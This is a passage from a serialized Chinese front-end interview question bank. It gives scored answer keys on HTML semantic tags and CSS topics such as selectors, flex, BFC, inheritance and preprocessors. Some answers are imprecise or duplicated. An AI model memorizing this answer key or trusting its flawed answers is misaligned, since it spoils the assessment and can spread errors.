类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：**  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。\\n- **1：**  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。\\n- **1：**  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。\\n- **1：**  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。\\n- **1：**  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。\\n","task":false,"loose":false,"text":"**1：**  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。","tokens":[{"type":"text","raw":"**1：**  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。","text":"**1：**  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。","text":"  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。\\n","task":false,"loose":false,"text":"**1：**  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。","tokens":[{"type":"text","raw":"**1：**  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。","text":"**1：**  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。","text":"  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。\\n","task":false,"loose":false,"text":"**1：**  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。","tokens":[{"type":"text","raw":"**1：**  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。","text":"**1：**  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。","text":"  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。\\n","task":false,"loose":false,"text":"**1：**  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。","tokens":[{"type":"text","raw":"**1：**  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。","text":"**1：**  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。","text":"  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","task":false,"loose":false,"text":"**1：**  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","tokens":[{"type":"text","raw":"**1：**  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","text":"**1：**  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","text":"  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。","escaped":false}]}]}]}]},{"key":"CSS","content":"<h1>CSS</h1>\\n<h2>CSS 有哪些选择器？权重是如何计算的？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong><ul>\\n<li>基本选择器：ID 选择器 &gt; 类选择器/伪类选择器/属性选择器 &gt; 元素选择器/伪元素选择器 &gt; 通配符选择器</li>\\n<li>关系选择器：后代选择器、父子选择器、兄弟选择器</li>\\n</ul>\\n</li>\\n<li><strong>1：</strong> ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。</li>\\n</ul>\\n<h2>margin 和 padding 的使用场景</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong><ul>\\n<li>需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；</li>\\n<li>需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>如何清除浮动?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong>\\n.clearfix{\\n  clear:both;\\n  content:&#39;&#39;;\\n  display:block;\\n  width: 0;\\n  height: 0;\\n  visibility:hidden;\\n}</li>\\n</ul>\\n<h2>使元素消失的方法?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong><ul>\\n<li>visibility:hidden;</li>\\n<li>display:none;</li>\\n<li>opacity:0;</li>\\n<li>z-index:-1;</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>理解BFC吗？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong>\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。<br>具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。<br>通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。</li>\\n</ul>\\n<h2>解释 CSS 中的 flex 布局，并列举一些常用的 flex 属性及其作用</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong>\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。</li>\\n</ul>\\n<h2>如何减少页面回流和重绘？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流</li>\\n<li><strong>1：</strong> 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流</li>\\n<li><strong>1：</strong> 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式</li>\\n<li><strong>1：</strong> 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。</li>\\n<li><strong>1：</strong> 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中</li>\\n</ul>\\n<h2>如何使用 calc() 函数？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> calc() 允许你在 CSS 中执行简单的数学运算。例如：</li>\\n</ul>\\n<pre><code class=\\"language-css\\">  width: calc(100% - 20px);\\n</code></pre>\\n<h2>CSS 中的三种常用布局方式？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> float 布局：通过浮动和清除浮动来实现布局</li>\\n<li><strong>1：</strong> flex 布局：更加现代和灵活，适用于一维布局</li>\\n<li><strong>1：</strong> grid 布局：二维布局，支持更复杂的布局</li>\\n</ul>\\n<h2>什么是 viewport？如何在页面中设置视口大小？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 视口是用户可以看到的网页区域。设置视口的常见做法是在 <code>&lt;head&gt;</code> 中添加如下标签</li>\\n</ul>\\n<pre><code class=\\"language-html\\">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\\n</code></pre>\\n<h2>解释 transform、translate、scale、rotate 等属性的使用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。</li>\\n<li><strong>1：</strong> translate(x, y)：平移元素</li>\\n<li><strong>1：</strong> rotate(deg)：旋转元素。</li>\\n<li><strong>1：</strong> scale(x, y)：缩放元素。</li>\\n</ul>\\n<h2>如何处理浏览器兼容性问题？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。</li>\\n<li><strong>1：</strong> 使用 Autoprefixer 等工具自动添加前缀。</li>\\n<li><strong>1：</strong> 测试多个浏览器，确保关键功能正常</li>\\n<li><strong>1：</strong> 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。</li>\\n</ul>\\n<h2>box-sizing: border-box 和 content-box 的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。</li>\\n<li><strong>1：</strong> border-box：width 和 height 包括内容区域、padding 和 border。</li>\\n</ul>\\n<h2>CSS3有哪些重要的新特性？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 选择器和伪类：</p>\\n<ul>\\n<li>属性选择器增强</li>\\n<li>新增伪类：:nth-child()、:first-of-type等</li>\\n<li>伪元素使用双冒号::before</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 视觉效果：</p>\\n<ul>\\n<li>圆角(border-radius)</li>\\n<li>阴影(text-shadow/box-shadow)</li>\\n<li>渐变(linear-gradient/radial-gradient)</li>\\n<li>RGBA和HSLA颜色</li>\\n<li>不透明度(opacity)</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 转换和动画：</p>\\n<ul>\\n<li>2D/3D转换(transform)</li>\\n<li>过渡效果(transition)</li>\\n<li>动画效果(animation/@keyframes)</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 布局能力：</p>\\n<ul>\\n<li>弹性布局(display: flex)</li>\\n<li>网格布局(display: grid)</li>\\n<li>多列布局(column-count)</li>\\n<li>盒模型调整(box-sizing)</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 响应式设计：</p>\\n<ul>\\n<li>媒体查询(@media)</li>\\n<li>视口单位(vh/vw)</li>\\n<li>图像适配(object-fit)</li>\\n<li>自定义属性(变量)</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>CSS哪些属性可以继承</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>1：</strong> 不可继承的</p>\\n<ul>\\n<li><p>display\\n指定元素的显示方式，常见的值包括：\\nblock：块级元素，占据整行\\ninline：行内元素，只占据必要的宽度，不换行\\ninline-block：结合了 inline 和 block 的特性\\nnone：隐藏元素</p>\\n</li>\\n<li><p>margin\\n设置元素外部的空白区域，即元素与其他元素之间的距离</p>\\n</li>\\n<li><p>border\\n设置元素的边框可以指定边框的宽度、样式和颜色</p>\\n</li>\\n<li><p>padding\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域</p>\\n</li>\\n<li><p>background\\n设置元素的背景，包括背景颜色、背景图像等</p>\\n</li>\\n<li><p>height\\n指定元素的高度</p>\\n</li>\\n<li><p>min-height\\n设置元素的最小高度，元素的高度不能小于此值</p>\\n</li>\\n<li><p>max-height\\n设置元素的最大高度，元素的高度不能超过此值</p>\\n</li>\\n<li><p>width\\n指定元素的宽度</p>\\n</li>\\n<li><p>min-width\\n设置元素的最小宽度，元素的宽度不能小于此值</p>\\n</li>\\n<li><p>max-width\\n设置元素的最大宽度，元素的宽度不能超过此值</p>\\n</li>\\n<li><p>overflow\\n控制当内容溢出元素的边界时如何显示常见的值：\\n  visible：内容溢出时可见\\n  hidden：内容溢出时隐藏\\n  scroll：出现滚动条\\n  auto：根据需要自动显示滚动条</p>\\n</li>\\n<li><p>position\\n设置元素的定位方式常见的值：\\n  static：默认值，元素按文档流排列\\n  relative：相对定位，元素相对于其原始位置偏移\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位</p>\\n</li>\\n<li><p>top, bottom, left, right\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量</p>\\n</li>\\n<li><p>z-index\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效</p>\\n</li>\\n<li><p>float\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n  left：元素向左浮动\\n  right：元素向右浮动\\n  none：取消浮动</p>\\n</li>\\n<li><p>clear\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n  left：禁止元素左侧有浮动元素\\n  right：禁止元素右侧有浮动元素\\n  both：禁止元素两侧有浮动元素\\n  none：允许两侧都有浮动元素</p>\\n</li>\\n<li><p>table-layout\\n控制表格布局的算法常见的值：\\n  auto：浏览器根据内容调整列宽（默认）\\n  fixed：浏览器根据表格的宽度固定列宽</p>\\n</li>\\n<li><p>vertical-align\\n控制元素在垂直方向上的对齐方式常见的值：\\n  top：元素顶部对齐\\n  middle：元素垂直居中对齐\\n  bottom：元素底部对齐</p>\\n</li>\\n<li><p>page-break-after\\n控制分页符的位置常见的值：\\n  auto：默认，自动决定分页\\n  always：强制分页\\n  avoid：避免分页</p>\\n</li>\\n<li><p>page-break-before\\n与 page-break-after 类似，控制元素前面的分页符</p>\\n</li>\\n<li><p>unicode-bidi\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n  normal：正常的双向文本布局\\n  embed：强制嵌入的文本遵循本地的方向性\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值</p>\\n</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 所有元素可继承的</p>\\n<ul>\\n<li><p>visibility\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n常见值包括：\\n  visible（默认值）：元素是可见的\\n  hidden：元素不可见，但仍然占据空间\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 <code>&lt;tr&gt;、&lt;th&gt;、&lt;td&gt;</code> 等表格元素）</p>\\n</li>\\n<li><p>cursor\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n常见值包括：\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n  default：默认的光标样式\\n  none：隐藏鼠标指针\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n  move：显示一个四向箭头，表示可以移动元素\\n  text：显示文本光标，通常用于文本输入区域\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n  help：显示问号光标，通常表示需要帮助的地方</p>\\n</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 终极块级元素可继承的</p>\\n<ul>\\n<li><p>text-indent\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 <code>&lt;p&gt;、&lt;div&gt;</code> 等，控制块内文本的缩进量；常见值：\\n  length：指定缩进的距离，例如 20px 或 2em\\n  %：表示缩进的百分比，基于元素的宽度\\n  initial：将属性恢复为默认值</p>\\n</li>\\n<li><p>text-align\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n  left：将文本对齐到左边\\n  right：将文本对齐到右边\\n  center：将文本居中\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式</p>\\n</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 内联元素可继承的</p>\\n<ul>\\n<li><p>letter-spacing\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n  normal：默认的字符间距，通常为 0\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em</p>\\n</li>\\n<li><p>word-spacing\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n常见值：\\n  normal：默认的单词间距。\\n  length：指定单词间距，可以使用 px、em、rem 等单位。</p>\\n</li>\\n<li><p>white-space\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n  pre：保留空格和换行符，类似于 <code>&lt;pre&gt;</code> 标签的效果\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n  pre-line：合并多个空白字符，但保留换行符</p>\\n</li>\\n<li><p>line-height\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n  number：指定行高为字体大小的倍数。\\n  length：指定固定的行高值，如 20px、1.5em。\\n  percentage：指定行高为字体大小的百分比。</p>\\n</li>\\n<li><p>color\\ncolor 用于设置文本的颜色，常见值：\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。</p>\\n</li>\\n<li><p>font</p>\\n<p>font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n  font-style、font-variant、font-weight、font-size、line-height、font-family</p>\\n</li>\\n<li><p>font-size\\nfont-size 用于设置文本的大小；常见值：\\n  length：如 12px、1em、0.75rem。\\n  percentage：相对于父元素的字体大小，如 150%。\\n  medium：默认字体大小。\\n  larger / smaller：相对于父元素字体大小的大小调整。</p>\\n</li>\\n<li><p>font-style\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n  normal：正常样式\\n  italic：斜体\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形</p>\\n</li>\\n<li><p>font-variant\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n  normal：正常字体。\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。</p>\\n</li>\\n<li><p>font-weight\\nfont-weight 用于设置文本的粗细；常见值：\\n  normal：正常的字体粗细\\n  bold：加粗字体\\n  bolder：比父元素更粗\\n  lighter：比父元素更细\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗</p>\\n</li>\\n<li><p>text-decoration\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n  none：无装饰\\n  underline：下划线\\n  overline：上划线\\n  line-through：删除线\\n  blink：闪烁的文本（大多数浏览器已不支持）</p>\\n</li>\\n<li><p>text-transform\\ntext-transform 用于控制文本的大小写转换；常见值：\\n  none：不转换大小写\\n  capitalize：将每个单词的首字母转换为大写\\n  uppercase：将所有字母转换为大写\\n  lowercase：将所有字母转换为小写</p>\\n</li>\\n<li><p>direction\\ndirection 用于设置文本的书写方向；常见值：\\n  ltr：从左到右（默认）\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言</p>\\n</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 列表元素可继承的属性</p>\\n<ul>\\n<li><p>list-style\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n  list-style-position：标记的位置，inside 或 outside。\\n  list-style-image：指定列表项标记为图片。</p>\\n</li>\\n<li><p>list-style-type\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n  disc：实心圆点（默认）\\n  circle：空心圆点\\n  square：方块\\n  decimal：数字列表（如 1, 2, 3）\\n  none：没有标记</p>\\n</li>\\n<li><p>list-style-position\\nlist-style-position 用于设置列表标记的位置；常见值：\\n  outside：标记在列表项外部（默认）\\n  inside：标记在列表项内部</p>\\n</li>\\n<li><p>list-style-image\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：<code>url(&lt;image-url&gt;)：指定图像的 URL，如 url(&#39;bullet.png&#39;)</code></p>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n</details>\\n\\n<h2>CSS 性能优化</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。</li>\\n<li><strong>1：</strong> 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent &gt;.child比.parent.class1.class2 &gt;.child性能更好。</li>\\n<li><strong>1：</strong> 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。</li>\\n<li><strong>1：</strong> 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。</li>\\n</ul>\\n<h2>CSS3中有哪些新特性</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）</p>\\n</li>\\n<li><p>圆角 （border-radius:8px）</p>\\n</li>\\n<li><p>多列布局 （multi-column layout）</p>\\n</li>\\n<li><p>阴影和反射 （box-shadow 和 reflect）</p>\\n</li>\\n<li><p>文字特效 （text-shadow）</p>\\n</li>\\n<li><p>线性渐变 （gradient）</p>\\n</li>\\n<li><p>旋转 （transform）</p>\\n</li>\\n<li><p>媒体查询 （@media）</p>\\n</li>\\n<li><p>2D、3D 转换和动画</p>\\n</li>\\n</ul>\\n<h2>单行、多行文本溢出隐藏</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>单行文本溢出</li>\\n</ul>\\n<pre><code class=\\"language-css\\">overflow: hidden;            // 溢出隐藏\\ntext-overflow: ellipsis;      // 溢出用省略号显示\\nwhite-space: nowrap;         // 规定段落中的文本不进行换行\\n</code></pre>\\n<ul>\\n<li>多行文本溢出</li>\\n</ul>\\n<pre><code class=\\"language-css\\">display: -webkit-box;         // 作为弹性伸缩盒子模型显示\\n-webkit-box-orient: vertical; // 设置伸缩盒子的子元素排列方式--从上到下垂直排列\\n-webkit-line-clamp: 3;        // 显示的行数\\noverflow: hidden;             // 溢出隐藏\\n</code></pre>\\n<h2>Sass、Less 是什么？为什么要使用他们？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。</p>\\n</li>\\n<li><p>为什么要使用它们？</p>\\n</li>\\n<li><p>结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。</p>\\n</li>\\n<li><p>可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。</p>\\n</li>\\n</ul>\\n<h2>z-index属性在什么情况下会失效?</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>通常 z-index 